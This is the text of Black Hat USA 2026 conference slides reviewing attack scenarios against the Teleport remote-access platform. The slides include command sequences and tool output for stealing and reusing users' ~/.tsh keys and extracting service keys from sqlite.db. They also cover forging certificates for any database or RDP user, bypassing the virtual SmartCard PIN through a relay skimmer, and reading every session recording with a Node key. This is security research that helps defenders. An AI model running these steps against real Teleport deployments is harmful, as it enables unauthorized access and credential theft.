---
title: "Beam Me Up, Luke A Review of Teleport Attack Scenarios"
speakers: ["Adam Chester"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf"
pages: 90
sha256: "3c995b4e09191cadbc261ccbc5d0f3ffc1d893909e081e9243ed23a96b7d120e"
text_chars: 31614
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.9
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 90
vision_verified_pages: 90
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:28:03Z"
---
# Beam Me Up, Luke A Review of Teleport Attack Scenarios

**Speakers:** Adam Chester  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf` (90 pages)


## Slide 1

**Beam Me Up, Luke**

A Review of Teleport Attack Scenarios

## Slide 2

# Agenda

- Introduction
- A Brief Overview of Teleport
- Attack Scenarios
- Hardening Steps

## Slide 3

# whoami

## Adam Chester (XPN)

- TRACE at SpecterOps
- Red Teamer
- Researcher
- Blogger

@_xpn_  /in/xpn

https://blog.xpnsec.com

## Slide 4

# What is Teleport?

Can be difficult to tell from the website: “Unified Identity Securing Classic & AI Infrastructure”

“Teleport establishes a unified identity layer secured cryptographically - minimizing access paths by eliminating identity fragmentation and credential sprawl.”

## Slide 5

# What is Teleport?

Teleport is a remote access solution

Similar to a VPN, it provides remote access to:

- SSH servers
- Windows servers
- Database servers
- MCP servers
- Internal web applications
- Kubernetes Pods

## Slide 6

# What is Teleport?

Provides auditing of sessions

- SSH Session Recordings
- Windows Desktop Recordings
- Database Session Recordings

Allows management of users & roles

Open Source & Enterprise Versions
Self Hosted & Cloud Hosted

Targets macOS / *nix - Over to you for Windows ;)

This research was completed on Teleport version v18.6.1

## Slide 7

# Navigating This Talk

A lot goes into Teleport, so we will focus on the key areas by walking through the various components:

- We’re going to put our Red Teamer hat on and walk through each component
- I’ll explain enough about how the component works
- Then I’ll show some methods that can be applied for offensive security use

As you watch, keep looking for opportunities to apply these concepts elsewhere in Teleport, you’ll likely find other issues.

Hope you didn’t ignore this

## Slide 8

# Architecture

Cluster

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 9

# Endpoint

Interaction with Teleport for a user is typically via one of two tools:

- tsh - CLI tool which allows authentication, access to services etc..
- web - Web UI used to access services such as RDP

Authentication to the Proxy Server is handled using a set of keys generated during initial authentication.

mTLS used with these keys to provide access to services via the Proxy Server

## Slide 10

# Endpoint

If you have access to an endpoint which has a user signed-in, we can take advantage of the existing session:

On *nix:

- ~/.tsh - Contains current set of keys
- ~/.tsh/keys/[cluster-name]/[username].crt
- ~/.tsh/keys/[cluster-name]/[username].key
- ~/.tsh/keys/[cluster-name]/[username].pub

On Windows:

C:\Users\[username]\.tsh

```text
attacker@teleport-linclient:~$ tsh ls --proxy 10.1.10.1:8443 --insecure
Enter password for Teleport user attacker:
ERROR: failed reading prompt response
        context canceled

attacker@teleport-linclient:~$ scp -r localuser@teleport-user:/home/localuser/.tsh ~/
localuser@teleport-user's password:
known_hosts
xpn-teleport-server.yaml
current-profile
example.com.pem
regular-user-no-agent.pub
example.com-cert.pub
certs.pem
regular-user-no-agent.crt
regular-user-no-agent.key
regular-user-no-agent
.config.json
attacker@teleport-linclient:~$ tsh ls
Node Name           Address        Labels
------------------  -------------- ------
teleport-node       ← Tunnel
teleport-node-2     ← Tunnel
xpn-teleport-server 127.0.0.1:3022

attacker@teleport-linclient:~$
```

Nothing tying the certificate or keys to the host by default, we can extract if needed.

## Slide 11

# Endpoint

Extract keys to local system

Works locally

```text
attacker@teleport-linclient:~$ tsh ls --proxy 10.1.10.1:8443 --insecure
Enter password for Teleport user attacker:
ERROR: failed reading prompt response
        context canceled

attacker@teleport-linclient:~$ scp -r localuser@teleport-user:/home/localuser/.tsh ~/
localuser@teleport-user's password:
known_hosts
xpn-teleport-server.yaml
current-profile
example.com.pem
regular-user-no-agent.pub
example.com-cert.pub
certs.pem
regular-user-no-agent.crt
regular-user-no-agent.key
regular-user-no-agent
.config.json
attacker@teleport-linclient:~$ tsh ls
Node Name           Address        Labels
------------------  -------------- ------
teleport-node       ← Tunnel
teleport-node-2     ← Tunnel
xpn-teleport-server 127.0.0.1:3022

attacker@teleport-linclient:~$
```

## Slide 12

# Endpoint

For connecting to services such as Database Servers, Application Servers, MCP Servers etc, Teleport provides access using the tsh command

- tsh db connect

```text
localuser@teleport-user:~/.tsh$ tsh db connect --db-user=xpn --db-name secret_db teleport-db
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10012
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## Slide 13

# Endpoint

This works by setting up a local proxy using tsh

client is then used to connect to the local proxy

The proxy wraps mysql traffic in a TLS authenticated session

Local Proxy

TLS Tunnel

mysql connection

## Slide 14

# Endpoint

If the victim is using a Database service, we can hijack this.

tsh acts as a tunnel proxy for things like database access:

```text
localuser@teleport-user:~$ lsof -i -P -n
COMMAND   PID       USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
tsh     18289 localuser    3u  IPv4 125547      0t0 TCP 127.0.0.1:38943 (LISTEN)
tsh     18289 localuser    7u  IPv4 126033      0t0 TCP 127.0.0.1:38943→127.0.0.1:51302 (ESTABLISHED)
tsh     18289 localuser    8u  IPv4 126035      0t0 TCP 10.1.10.22:60396→10.1.10.1:8443 (ESTABLISHED)
mysql   18300 localuser    3u  IPv4 124587      0t0 TCP 127.0.0.1:51302→127.0.0.1:38943 (ESTABLISHED)
```

So we can just use the existing TCP socket to reach the same database server.

```text
mysql --defaults-group-suffix=_[cluster-name]-[service-name] \
        --skip-password \
        --user xpn \
        --database secret_db \
        --port 38943 \
        --host localhost \
        --protocol TCP
```

## Slide 15

# Endpoint

User is executing tsh command, so we hijack the connection:

```text
localuser@teleport-user:~$ mysql --defaults-group-suffix=_example.com-teleport-db --skip-password --user xpn --database secret_db --port 38943 --host localhost --protocol TCP
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10015
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## Slide 16

# Endpoint

If we list the .tsh directory again, we’ll find a new set of keys:

```text
localuser@teleport-user:~$ eza -T ~/.tsh
/home/localuser/.tsh
├── bin
├── current-profile
├── keys
│   └── xpn-teleport-server
│       ├── cas
│       │   └── example.com.pem
│       ├── certs.pem
│       ├── database-user
│       └── database-user-db
│           └── example.com
│               ├── teleport-db.crt
│               └── teleport-db.key
```

Again these keys can be extracted and used from another host.

I’ll answer the “how did they get there” question later

## Slide 17

# Endpoint

Same works for:

## Applications

```text
localuser@teleport-user:~$ eza -T ~/.tsh/
/home/localuser/.tsh
├── bin
├── current-profile
├── keys
│   └── xpn-teleport-server
│       ├── cas
│       │   └── example.com.pem
│       ├── certs.pem
│       ├── regular-user
│       ├── regular-user-app
│       │   └── example.com
│       │       ├── blog-access.crt
│       │       └── blog-access.key
│       ├── regular-user-ssh
│       │   └── example.com-cert.pub
│       ├── regular-user.crt
│       ├── regular-user.key
│       └── regular-user.pub
├── known_hosts
└── xpn-teleport-server.yaml
```

## SSH

```text
localuser@teleport-user:~$ eza -T ~/.tsh/
/home/localuser/.tsh
├── bin
├── current-profile
├── keys
│   └── xpn-teleport-server
│       ├── cas
│       │   └── example.com.pem
│       ├── certs.pem
│       ├── regular-user
│       ├── regular-user-app
│       │   └── example.com
│       │       ├── blog-access.crt
│       │       └── blog-access.key
│       ├── regular-user-ssh
│       │   └── example.com-cert.pub
│       ├── regular-user.crt
│       ├── regular-user.key
│       └── regular-user.pub
├── known_hosts
└── xpn-teleport-server.yaml
```

I’ll answer the “how did they get there” question later

## Slide 18

# Architecture

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 19

# Proxy Server

Teleport Proxy Server provides the tunnel between external to internal connections

Proxy Servers are stateless and several can be used for redundancy

Uses Application Layer Protocol Negotiation (ALPN) to route connections:

```text
Extension: application_layer_protocol_negotiation (len=29)
    Type: application_layer_protocol_negotiation (16)
    Length: 29
    ALPN Extension Length: 27
    ALPN Protocol
        ALPN string length: 23
        ALPN Next Protocol: teleport-proxy-ssh-grpc
        ALPN string length: 2
        ALPN Next Protocol: h2
```

## Slide 20

# Proxy Server

A few Teleport supported ALPN values:

- teleport-auth - Access to the Auth Server
- teleport-mysql - Access to a mysql Server
- teleport-reversetunnel - Used by internal servers to create reverse tunnels
- teleport-mcp - Access a MCP server

Elegant way to support multiple protocols across a single TCP port

Teleport call this “multiplexing” and it is the default routing method

Makes research difficult, so we need tooling

Full list of ALPN

## Slide 21

# Proxy Server

One of the difficulties for researchers is creating authenticated tunnels through the proxy server when testing

tsh provides proxy commands (as we saw with database), but research needs arbitrary attributes like ALPN values

## Slide 22

# Teleport API

tunnel-manager is a simple tool which establishes a connection over TLS

You provide a client certificate/key and a ALPN, and tunnel-manager creates the TLS connection, binding to a TCP port for other applications to use

Think SOCAT

TLS Tunnel

gRPC Traffic

## Slide 23

# Architecture

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 24

# Auth Server

Consists of a certificate authority and provides control plane for the Teleport cluster

Stores user-accounts, roles, CA certificates in a database:

- Uses a local SQLite database by default
- Postgres, DynamoDB, GCP Firestore all supported as options

If you compromise the database, you own the Teleport Cluster

## Slide 25

# Auth Server

Also stores Audit Logs and Session Recordings:

- Recordings stored to a local filesystem by default
- Also supports S3 or Google Cloud Storage

Storage logs can be encrypted (not default in self-hosted open source version)

Format is:

- 24 bytes of header
- Remaining is gzip compressed

Decode with:

```text
dd if=log.tar bs=1 skip=24 | gunzip
```

## Slide 26

# Auth Server

Acts as a Certificate Authority & Control Plane

Signs certificates with one of several CA certificates, for example:

- Host CA
- User CA
- Database CA
- Windows Desktop CA

Auth Server service exposed on port 3050 internally, but interaction is normally via the Proxy Server

## Slide 27

# Auth Server

Teleport supports Role Based Access Controls

Options cover service specific toggles

```yaml
kind: role
version: v5
metadata:
  name: example-role
spec:
  options:
    forward_agent: true
    ssh_port_forwarding:
      remote:
        enabled: true
      local:
        enabled: true
    record_session:
      desktop: true
      ssh: best_effort
  allow:
    logins: [root, localuser]
    windows_desktop_logins: [Administrator]
    db_users: [mysql, sa]
    db_names: [super_secret_db]
    node_labels:
```

## Slide 28

# Auth Server

Allow section sets permitted Users, databases, desktop names

Labels permit access to matching resources

Rules permit access to resource actions (CRUD)

```yaml
      desktop: true
      ssh: best_effort
  allow:
    logins: [root, localuser]
    windows_desktop_logins: [Administrator]
    db_users: [mysql, sa]
    db_names: [super_secret_db]
    node_labels:
      'label-name': 'matching-value'
  deny:
    node_labels:
      'workload': ['database', 'backup']
  rules:
    - resources: [node]
      verbs: [list, read]
    - resources: [session]
      verbs: [list, create, read, update, delete]
    - resources: [user]
      verbs: [list, create, read, update, delete]
```

## Slide 29

# Auth Server

The Auth Server exposes the Teleport API

Two API transports are:

- HTTP via a REST API
- gRPC over a TLS endpoint

List of .proto files can be found in the Teleport git repo

```text
❯ ls ./proto/teleport/legacy/client/proto
Permissions Size User Date Modified Git Name
.rw-r--r--@ 178k xpn 13 Jan 12:20  -- authservice.proto
.rw-r--r--@ 1.4k xpn 13 Jan 12:17  -- certs.proto
.rw-r--r--@  12k xpn 13 Jan 12:20  -- event.proto
.rw-r--r--@  13k xpn 13 Jan 12:17  -- inventory.proto
.rw-r--r--@  14k xpn 13 Jan 12:17  -- joinservice.proto
.rw-r--r--@ 2.4k xpn 13 Jan 12:20  -- proxyservice.proto
.rw-r--r--@ 2.0k xpn 13 Jan 12:17  -- requestable_roles.proto
```

## Slide 30

# Auth Server

We can navigate with grpcui to interact with most of the exposed gRPC methods:

```text
grpcui \
  -import-path ./gogo \
  -import-path ./teleport/api/proto \
  -proto ./teleport/api/proto/teleport/legacy/client/proto/authservice.proto \
  teleport-server:443
```

Most gRPC services require TLS authentication and an ALPN value which grpcui doesn’t support

Tunnel-Manager can be used for this:

```text
./tunnel-manager alpn \
  -b 127.0.0.1:9090 \
  -c /tmp/client.crt \
  -k /tmp/client.key \
  -p 'teleport-auth@,h2' \
  -x teleport-server:8443

[*] Starting TCP server to connection proxy: [127.0.0.1:9090]
[*] Local server listening on 127.0.0.1:9090
```

## Slide 31

# Auth Server

To access the Auth Server, we need to use two ALPN values

ALPN in in the format of:

teleport-auth@5448495369736e7441637466.teleport.cluster.local,h2

- 5448495369736e7441637466 - Hex encoded Cluster Name
- h2 - Secondary ALPN value

## Slide 32

# Auth Server

When tunnel-manager is used, we can use grpcui to explore the API:

```text
./tunnel-manager alpn \
  -b 127.0.0.1:9090 \
  -c /tmp/client.crt \
  -k /tmp/client.key \
  -p 'teleport-auth@,h2' \
  -x teleport-server:8443

[*] Starting TCP server to connection proxy: [127.0.0.1:9090]
[*] Local server listening on 127.0.0.1:9090
```

```text
grpcui \
  -import-path ./gogo \
  -import-path ./teleport/api/proto \
  -proto ./teleport/api/proto/teleport/legacy/client/proto/authservice.proto \
  -insecure \
  localhost:9090
```

## Slide 33

# Auth Server

Now we can answer the question of “how did the new database keys get there”?

1. A TLS connection is established to the Auth Server using the users TLS key
2. The AuthService gRPC service GenerateUserCerts method is invoked with a public key to be signed
3. A signed certificate is returned which grants access to the service

## Slide 34

# Auth Server

Certificates returned are signed by the relevant CA in Teleport

- Subject - Usage restrictions:
  - CN - The username of the authenticating user
  - O - The Teleport groups the user is a member of
  - OU - Any restrictions on the user session
  - L - Principals used for authentication to SSH services
  - S - The cluster name
  - postalCode - Traits

Maximum time: ~10 hours

Additional Extensions

## Slide 35

# Auth Server

Our Database Cert:

```text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            8b:1c:92:63:5d:39:55:3d:18:8d:08:cc:2a:9d:9a:53
        Signature Algorithm: ecdsa-with-SHA256
        Issuer: O = example.com, CN = example.com, serialNumber = 243482347097375718873323822709537121777
        Validity
            Not Before: Jun 25 22:37:33 2026 GMT
            Not After : Jun 26 10:37:05 2026 GMT
        Subject: L = -teleport-internal-join + L = -teleport-nologin-2c3485f4-f0f7-4a60-b0fd-50d360fe4050, street = example.com, postalCode = null, O = access + O = database-access, OU = usage:db, CN = database-user, 1.3.9999.1.7 = example.com, 1.3.9999.1.9 = 10.1.10.21, 1.3.9999.2.1 = teleport-db, 1.3.9999.2.2 = mysql, 1.3.9999.2.3 = xpn, 1.3.9999.2.4 = secret_db, 1.3.9999.2.5 = secret_db, 1.3.9999.2.6 = localuser, 1.3.9999.2.6 = xpn, 1.3.9999.1.20 = local, 1.3.9999.1.15 = none
```

O access, database-access
OU usage:db
CN username

1.3.9999.2.1 Database service name = teleport-db
1.3.9999.2.2 Database protocol = mysql
1.3.999.2.3 Database username = xpn
1.3.999.2.4 Database name = secret_db

## Slide 36

# Auth Server

This is why the Proxy Server can be stateless, any information needed to approve or deny a connection is contained in the certificate

Also means that if we access a certificate, we can validate what access a user may have based on the certificate contents alone

Nothing to stop us from taking a compromised certificate, and periodically extending this using GenerateUserCerts API!

## Slide 37

# Architecture

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 38

# Services

When Teleport Agent is installed, services are configured to expose local or remote servers.

Several types of services exist:

- Node Service (SSH)
- Database Service
- Windows Desktop Service
- Application Service
- MCP Service

Services act as reverse-proxies for local and remote servers.

## Slide 39

# Services

Keys for services are stored in /var/lib/teleport/proc/sqlite.db

These keys are the authentication keys for the services offered by the server

These keys can be extracted similar to user keys and used from a different host

```text
sqlite> select * from kv where key = '/ids/node/current';
/ids/node/current|1782405456875329400||{"kind":"identity","version":"v2","metadata":{"name":"current"},"spec":{"key":"LS0tLS1CRUdJT...
...
```

## Slide 40

# Database Service

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 41

# Database Service

Database Service acts as a reverse proxy to a database

Database uses certificates for authentication (signed by the Teleport CA)

Reminder that tsh CLI command provides access to a target database

```text
localuser@teleport-user:~$ tsh db connect --db-user=xpn --db-name secret_db teleport-db
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10001
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## Slide 42

# Database Service

Auth Server

Proxy Server

Database Service

MySQL Server

User

## Slide 43

# Database Service

Configuring the back-end database means adding the Teleport Database Client CA cert to the database server

The Teleport Database Service can then generate authentication certificates for connecting users on the fly

## Slide 44

# Database Service

Auth Server

Proxy Server

Database Service

MySQL Server

User

SSL Added and removed here! :)

## Slide 45

# Database Service

If we compromise a Database Service server, we have the option to authenticate as ANY USER to the database server.

This can be thought of as a silver-ticket style attack

We need to extract the service key from /var/lib/teleport/proc/sqlite.db

certificate-tool built to automate this generation

GenerateDatabaseCert API method used to sign

```text
go run ./main.go database \
    --cert /tmp/db.crt \
    --key /tmp/db.key \
    --user localuser \
    --output /tmp/lelu/

[*] Certificates generated:
        /tmp/lelu/localuser.csr
        /tmp/lelu/localuser.key
```

## Slide 46

# Database Service

But… we can also authenticate as ANY USER to ANY OTHER DATABASE within a Cluster:

```text
[*] Certificates generated:
        /tmp/bob-mysql/bob.csr
        /tmp/bob-mysql/bob.key

openssl rsa -in /tmp/bob-mysql/bob.key -out /tmp/bob-mysql/bob-new.key
writing RSA key

mysql -h 10.1.10.52 --ssl-cert /tmp/bob-mysql/database_tls_signed.crt --ssl-key /tmp/bob-mysql/bob-new.key -u bob --database ultra_secure
```

## Slide 47

Recording: https://youtu.be/Su5p-T_09Kc

## Slide 48

# Database Golden Certificate

Why does this work?

Teleport requires that databases trust the same database CA certificate across the cluster.

Database services register their back-end databases dynamically to the Auth Server, there is no way for Teleport to know up front which databases or users should be permitted.

```yaml
db_service:
  enabled: true
  databases:
    - name: "teleport-db"
      description: "Self-hosted MySQL DB"
      protocol: "mysql"
      uri: "teleport-db:3306"
      tls:
        mode: "verify-full"
```

## Slide 49

# Windows Service

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 50

# Windows Service

Auth Server

Proxy Server

Windows Service

Windows Server

User

## Slide 51

# Windows Service

Windows Service exposes RDP via a reverse-tunnel

Web interface used to interact with the back-end Windows Server

Select user to authenticate as, and Teleport handles the rest

I was at Starbucks :(

## Slide 52

# Windows Authentication

Windows access is currently via the Teleport web UI:

Behind the scenes, this is a port of IronRDP with Virtual SmartCard support bolted on

## Slide 53

# Windows Authentication

Authentication uses certificates signed by Teleport’s Windows Desktop CA

Access to a Windows Service means the same attack is possible as the Database server, we can request certificates for any user for any RDP server in the Cluster

Use the service TLS key and Certificate to request via GenerateWindowsDesktopCert

## Slide 54

# Windows Golden Certificate

certificate-tool allows us to automate this:

```text
go run ./main.go windows \
    --cert /tmp/win.crt \
    --key /tmp/win.key \
    --user localuser \
    --target TELEPORT-WINCLIENT-2 \
    --output /tmp/lelu/

[*] Certificates generated:
        /tmp/lelu/TELEPORT-WINCLIENT-2.csr
        /tmp/lelu/TELEPORT-WINCLIENT-2.key
```

## Slide 55

# Windows Golden Certificate

But unlike other Teleport services, we need a new client to use the certificate.

I created a fork of IronRDP which we can use without a browser

This fork adds in Teleport’s SmartCard PIV support

Allows us to take any generated certificate from a compromised Windows Service, and authenticate to a Windows server directly over RDP using a Virtual SmartCard.

## Slide 56

# Windows Golden Certificate Demo

```text
RDPDR PDU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(LongReturn { return_code: Success })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(ReadCacheReturn { return_code: CacheItemNotFound, data: [] })) }))
...
```

## Slide 57

```text
go run ./main.go windows -c ~/win.crt -k ~/win.key -t TELEPORT-WINCLIENT-2 -u localuser -o /tmp/
```

Recording: https://youtu.be/h2Ky-BMCLLk

## Slide 58

# Windows

That’s not all…

## Slide 59

# SmartCard PIV 101

A SmartCard in RDP works by exposing a virtual channel from the client host to the server.

Allows connection of a SmartCard to a client to be shared with the server for hopping to further servers.

PIV (Personal Identity Verification) is the interface used to expose cryptographic operations to the OS

Commands are sent using APDU (Application Protocol Data Unit)

APDU has the following structure:

CLA | INS | P1 | P2 | Len | Data | Response Len

Operations we care about for this section are:

1. VERIFY PIN - Verifies that a user-provided PIN is valid for the card before allowing authentication
2. GENERAL AUTHENTICATE - Challenge / Response Authentication

## Slide 60

# Windows SmartCard

Teleport Virtual SmartCard is initialized with a random PIN

It is made available to RDP over a virtual channel by default

But without knowing the PIN, it can’t be used

```rust
fn handle_verify(&mut self, cmd: Command<S>) -> PduResult<Response> {
    if cmd.data() == self.pin.as_bytes() {
        Ok(Response::new(Status::Success))
    } else {
        warn!("PIN mismatch, want {}, got {:?}", self.pin, cmd.data());
        Ok(Response::new(Status::VerificationFailed))
    }
}
```

Comparison between PIN and stored random PIN

## Slide 61

# Windows SmartCard

APDU instructions are dispatched to their appropriate handler by the Virtual SmartCard

```rust
let resp = match cmd.instruction() {
    Instruction::Select => self.handle_select(cmd),
    Instruction::Verify => self.handle_verify(cmd),
    Instruction::GetData => self.handle_get_data(cmd),
    Instruction::GetResponse => self.handle_get_response(cmd),
    Instruction::GeneralAuthenticate => self.handle_general_authenticate(cmd),
    _ => {
        warn!("unimplemented instruction {:?}", cmd.instruction());
        Ok(Response::new(Status::InstructionNotSupportedOrInvalid))
    }
}?;
debug!("send response: {:?}", resp);
debug!("response data: {}", to_hex(&resp.encode()));
Ok(resp)
```

But… there is no state being managed.

This means that a PIN is not required to be valid before we can authenticate

## Slide 62

# Windows Authentication

MSTSC.exe (RDP) uses the WinSCard.dll API’s to communicate with the SmartCard

SCardTransmit API to send commands to the SmartCard

As the PIN check is stateless, we can intercept SCardTransmit and simply reply with a SUCCESS.

As the SmartCard never verifies if the PIN was valid (or even provided), MSTSC.exe then just moves onto the GENERAL AUTHENTICATE command.

A lot goes into Windows to avoid hijacking SmartCards across Logon Sessions, so not as simple as just spawning MSTSC.exe as a victim user, as the current Logon Session ID (and not the Token) is used to select the SmartCard.

The attack then becomes a relay attack!

## Slide 63

# Windows Authentication

The plan becomes:

1. As an elevated user, we wait for a victim to authenticate to a shared host using Teleport
2. We immediately execute a SmartCard “skimmer” application as the victim user which waits for connections over a named pipe.
3. We start MSTSC.exe as our attacking user, hooking SCardTransmit API
4. We intercept any requests for a PIN, and simply reply with a SUCCESS
5. We forward any GENERAL AUTHENTICATE commands over the named pipe to be serviced by the victim’s Teleport SmartCard

If all works well, we can hijack the SmartCard of the user, evade PIN requirements, and hop onto another RDP server as the victim.

## Slide 64

# Windows Authentication

```text
C:\temp>whoami
winclient1\administrator

C:\temp>SmartcardSkimmer.exe
83 109 97 114 116 99 97 114 100
83 107 105 109 109 101 114
    @_xpn_

[*] Baseline PID: 1584
[*] New user session found: 4112
[*] New DLL Loaded, threadId: 772
```

## Slide 65

Recording: https://youtu.be/SUIM9Y_owMY

## Slide 66

# Node Service

Database  Windows RDP  Node

Auth Server

Proxy Server

User

## Slide 67

# Node Service

Teleport provided SSH Server

Uses Certificates for Authentication (signed by the Teleport SSH CA)

Security preferences baked into certificate:

```text
~/.tsh/keys/xpn-teleport-server/regular-user-ssh/example.com-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:7nUg2rJyshLy5LApYOFUvry4dj65luGdp9iC8978m7c
        Signing CA: ED25519 SHA256:/zMiJtCmFf91ri5qYYJhnx8hz9tQ6tLkh1qv30yCFa4 (using ssh-ed25519)
        Key ID: "regular-user"
        Serial: 0
        Valid: from 2026-06-30T10:02:04 to 2026-06-30T22:03:04
        Principals:
                localuser
                -teleport-internal-join
        Critical Options: (none)
        Extensions:
                login-ip UNKNOWN OPTION: 0000000a31302e312e31302e3232
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                private-key-policy UNKNOWN OPTION: 000000046e6f6e65
                teleport-roles UNKNOWN OPTION: 000000147b22726f6c6573223a5b22616363657373225d7d
                teleport-route-to-cluster UNKNOWN OPTION: 0000000b6578616d706c652e636f6d
                teleport-traits UNKNOWN OPTION: 000000187b226c6f67696e73223a5b226c6f63616c75736572225d7d
```

## Slide 68

# Node Service

Auth Server

Proxy Server

Node Service

User

## Slide 69

# Node Service

SSH access works via SSH certificate

Determines which user accounts we can access:

Node itself is a service which authenticates to the auth server using its own key. Found in /var/lib/teleport/proc/sqlite.db:

KV table contains keys:

```text
sqlite> select * from kv where key = '/ids/node/current';
/ids/node/current|1782405456875329400||{"kind":"identity","version":"v2","metadata":{"name":"current"},"spec":{"key":"LS0tLS1CRUdJTiBQUklWQVRF...
...
```

## Slide 70

# Node Service

```text
~/.tsh/keys/xpn-teleport-server/regular-user-ssh/example.com-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:7nUg2rJyshLy5LApYOFUvry4dj65luGdp9iC8978m7c
        Signing CA: ED25519 SHA256:/zMiJtCmFf91ri5qYYJhnx8hz9tQ6tLkh1qv30yCFa4 (using ssh-ed25519)
        Key ID: "regular-user"
        Serial: 0
        Valid: from 2026-06-30T10:02:04 to 2026-06-30T22:03:04
        Principals:
                localuser
                -teleport-internal-join
        Critical Options: (none)
        Extensions:
                login-ip UNKNOWN OPTION: 0000000a31302e312e31302e3232
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                private-key-policy UNKNOWN OPTION: 000000046e6f6e65
                teleport-roles UNKNOWN OPTION: 000000147b22726f6c6573223a5b22616363657373225d7d
                teleport-route-to-cluster UNKNOWN OPTION: 0000000b6578616d706c652e636f6d
                teleport-traits UNKNOWN OPTION: 000000187b226c6f67696e73223a5b226c6f63616c75736572225d7d
```

Users that can auth

Permitted Forwarding

Policy
none

User Roles
{"roles":["access"]}

Cluster Name
example.com

Traits
{"logins":["localuser"]}

## Slide 71

# Node

Extracting the key allows authentication to the Auth Server to allow for things like:

- Generating new SSH keys
- Generating new TLS certificates
- Uploading recorded sessions

## Slide 72

# Node

The problem is, permissions for the internal Node role are scoped too wide.

Access to a single Node cert gives access to ALL RECORDS ACROSS A CLUSTER

```go
case types.RoleNode:
    return services.RoleFromSpec(
        role.String(),
        types.RoleSpecV6{
            Allow: types.RoleConditions{
                Namespaces: []string{types.Wildcard},
                NodeLabels: types.Labels{types.Wildcard: []string{types.Wildcard}},
                Rules: []types.Rule{
                    types.NewRule(types.KindNode, services.RW()),
                    types.NewRule(types.KindSSHSession, services.RW()),
                    types.NewRule(types.KindSession, services.RO()),
                    types.NewRule(types.KindEvent, services.RW()),
                    ...
```

This rule allows access to SSH Session Recordings

While this one allows enumerating Required Session ID

## Slide 73

# Node

Log-Viewer tool created to list all available session recordings.

Provide a Node key and point at a proxy to get a list

```text
❯ ./log-viewer list \
    --cert /tmp/node.crt \
    --key /tmp/node.key \
    --proxy xpn-teleport-server:8443

[b9c5c4ca-3ae0-43a0-8d4a-9eac4482f188]: xpn@node1 - 2026-06-29 12:30:57 - 1 seconds
[c10decb0-0ffa-47a9-8a38-3903a03516f3]: xpn@node21 - 2026-06-29 15:57:43.087 - 2735 seconds
[4fe5f304-e67b-42cb-a2dd-9a7d2e987812]: default@node1 - 2026-06-30 14:03:20.967 - 16 seconds
[2f8596b0-d287-4b66-b189-2a565c630a3c]: admin@node1 - 2026-06-30 14:06:43.194 - 74 seconds
[c686e643-a18b-49f9-8176-86bb02a36297]: xpn@node2 - 2026-06-30 14:07:10.364 - 17 seconds
[92019612-2141-4eb6-88fc-d180562214d2]: xpn@node2 - 2026-07-01 18:35:54.924 - 74665 seconds
```

## Slide 74

# Node

```text
❯ go run log-viewer/main.go list --cert /tmp/node.crt --key /tmp/node.key --proxy xpn-teleport-server:8443

[b9c5c4ca-3ae0-43a0-8d4a-9eac4482f188]: localuser@teleport-node - 2026-06-29 12:30:57.867 +0000 UTC - 1 seconds
[c10decb0-0ffa-47a9-8a38-3903a03516f3]: localuser@teleport-node - 2026-06-29 15:57:43.087 +0000 UTC - 2735 seconds
[4fe5f304-e67b-42cb-a2dd-9a7d2e987812]: localuser@teleport-node - 2026-06-30 14:03:20.967 +0000 UTC - 16 seconds
[2f8596b0-d287-4b66-b189-2a565c630a3c]: localuser@teleport-node - 2026-06-30 14:06:43.194 +0000 UTC - 74 seconds
[c686e643-a18b-49f9-8176-86bb02a36297]: localuser@teleport-node - 2026-06-30 14:07:10.364 +0000 UTC - 17 seconds
